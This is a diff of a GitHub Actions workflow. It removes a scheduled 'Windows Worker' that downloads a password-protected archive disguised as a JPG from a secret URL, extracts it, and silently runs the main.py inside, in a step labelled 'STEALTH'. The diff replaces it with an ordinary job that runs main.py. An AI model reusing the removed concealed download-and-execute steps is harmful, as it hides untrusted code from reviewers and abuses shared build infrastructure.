@@ -1,54 +1,28 @@
-name: Windows Worker
+name: Run main.py on Windows
 
 on:
+  push:
+    branches: [ main ]
   workflow_dispatch:
-  schedule:
-    - cron: "*/30 * * * *"
-
-concurrency:
-  group: worker
-  cancel-in-progress: true
 
 jobs:
-  worker:
+  run-main:
     runs-on: windows-latest
-    timeout-minutes: 90
 
     steps:
-      - uses: actions/checkout@v3
+      - uses: actions/checkout@v4
 
-      - name: Setup Python
-        uses: actions/setup-python@v5
+      - uses: actions/setup-python@v5
         with:
           python-version: "3.10"
 
-      - name: Prepare dependencies (silent)
-        shell: powershell
+      - name: Install dependencies
+        shell: cmd
         run: |
-          choco install 7zip -y --no-progress > $null
+          python -m pip install --upgrade pip
+          if exist requirements.txt (
+            pip install -r requirements.txt
+          )
 
-      - name: Download model (jpg disguised)
-        shell: powershell
-        env:
-          MODEL_URL: ${{ secrets.LINK }}
-        run: |
-          $ProgressPreference = 'SilentlyContinue'
-          Invoke-WebRequest -Uri "$Env:MODEL_URL" -OutFile "model.jpg" > $null
-
-      - name: Rename & extract model
-        shell: powershell
-        env:
-          ARCHIVE_KEY: ${{ secrets.PASSWORD }}
-        run: |
-          Rename-Item model.jpg model.7z
-          & "C:\Program Files\7-Zip\7z.exe" x model.7z -p"$Env:ARCHIVE_KEY" -oextracted -y > $null
-
-      - name: Run main.py (STEALTH)
-        shell: powershell
-        run: |
-          $ErrorActionPreference = 'SilentlyContinue'
-
-          $main = Get-ChildItem extracted -Recurse -Filter main.py | Select-Object -First 1
-          if (-not $main) { exit 0 }
-
-          cmd /c "python `"$($main.FullName)`" > nul 2>&1"
+      - name: Run main.py
+        run: python main.py
